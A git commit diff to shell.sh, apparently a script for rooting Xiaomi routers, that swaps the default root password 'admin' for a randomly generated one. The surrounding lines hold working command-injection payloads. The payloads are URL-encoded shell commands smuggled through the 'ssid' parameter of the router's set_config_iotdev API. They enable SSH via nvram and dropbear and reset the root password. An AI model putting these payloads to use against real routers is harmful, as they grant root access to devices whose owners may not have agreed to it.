67ea2c1b2b7d0dbde4f9810b9db5a41905ca392c
h53 <23337731+h53@users.noreply.github.com>
2024-08-08 19:15:37 +0800

    random generated passwd

--- shell.sh
+++ shell.sh
@@ -13,11 +13,8 @@ if [ -z $stok ]; then
   exit 1
 fi
 
-if [ -z $passwd ]; then
-  echo "set root password default to admin"
-fi
-
-passwd=${passwd:=admin} # default password is admin
+passwd=${passwd:=`openssl rand -base64 12`} # use generated password
+echo "set root password to $passwd"
 
 enable_ssh="http://192.168.31.1/cgi-bin/luci/;stok=$stok/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B"
 change_passwd="http://192.168.31.1/cgi-bin/luci/;stok=$stok/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20echo%20-e%20'$passwd%5Cn$passwd'%20%7C%20passwd%20root%3B"
